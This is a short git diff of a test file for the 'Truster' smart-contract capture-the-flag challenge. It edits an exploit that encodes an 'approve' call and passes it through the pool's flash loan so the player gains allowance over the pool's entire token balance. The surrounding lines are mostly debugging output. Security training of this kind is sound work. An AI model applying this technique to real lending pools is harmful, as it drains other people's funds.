@@ -28,7 +28,7 @@ describe('[Challenge] Truster', function () {
         //console.log("tokenIFace:", token.interface)
         const poolBalance = await token.balanceOf(pool.address)
         console.log("poolBalance:", poolBalance)
-        //const hackedData = token.interface.encodeFunctionData("approve", [playar.address, poolBalance]);
+        const hackedData = token.interface.encodeFunctionData("approve", [player.address, poolBalance]);
         //console.log("hackedData:", hackedData)
         console.log("pooladdress:", pool.address)
         //console.log("address(pool)", address(pool))
@@ -38,7 +38,7 @@ describe('[Challenge] Truster', function () {
             0, 
             player.address, 
             token.address, 
-            token.interface.encodeFunctionData("approve", [player.address, poolBalance])
+            hackedData
             )
         console.log('benchmark 1')
         const getAllow = await token.allowance(pool.address, player.address)
